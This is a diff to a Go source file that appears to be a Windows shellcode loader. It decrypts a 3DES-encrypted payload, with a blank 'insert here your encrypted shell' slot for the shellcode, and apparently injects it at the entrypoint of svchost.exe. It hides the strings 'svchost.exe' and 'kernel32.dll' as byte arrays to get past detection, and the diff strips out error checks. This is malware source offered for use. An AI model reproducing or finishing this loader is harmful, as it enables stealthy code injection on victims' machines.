@@ -12,15 +12,12 @@ import (
 	"net/http"
 	"crypto/cipher"
 	"crypto/des"
-	"fmt"
 	"strings"
 	"syscall"
 	"unsafe"
 	"encoding/binary"
 	"runtime"
   	"time"
-	"os"
-	"log"
 )
 
 type PROCESS_BASIC_INFORMATION struct {
@@ -212,16 +209,10 @@ func main() {
         return 
     }
 	
-
 	epath := []byte{
 		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
 	}
 	path := string(epath) 
-
-	_, err := os.Stat(path)
-	if err != nil {
-		log.Fatal(err)
-	}
 	
 	//insert here your encrypted shell
 	sch := []byte("")
@@ -270,7 +261,7 @@ func main() {
 	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
 	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
 	zzzh()
-	decryptedsch, err := decryptDES3(sch, key, iv)
+	decryptedsch := decryptDES3(sch, key, iv)
 		syscall.MustLoadDLL(string([]byte{
 		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
 	})).MustFindProc(string([]byte{
@@ -285,26 +276,17 @@ func main() {
 }
 
 
-func decryptDES3(ciphertext, key, iv []byte) ([]byte, error) {
-	block, err := des.NewTripleDESCipher(key)
-	if err != nil {
-		return nil, err
-	}
+func decryptDES3(ciphertext, key, iv []byte) []byte {
+    block, _ := des.NewTripleDESCipher(key)
+    mode := cipher.NewCBCDecrypter(block, iv)
 
-	if len(ciphertext)%block.BlockSize() != 0 {
-		return nil, fmt.Errorf("Ciphertext length is not a multiple of the block size")
-	}
+    decrypted := make([]byte, len(ciphertext))
+    mode.CryptBlocks(decrypted, ciphertext)
 
-	mode := cipher.NewCBCDecrypter(block, iv)
+    decrypted = unpad(decrypted)
 
-	decrypted := make([]byte, len(ciphertext))
-	mode.CryptBlocks(decrypted, ciphertext)
-
-	decrypted = unpad(decrypted)
-
-	return decrypted, nil
+    return decrypted
 }
-
 func unpad(data []byte) []byte {
 	padding := int(data[len(data)-1])
 	return data[:len(data)-padding]
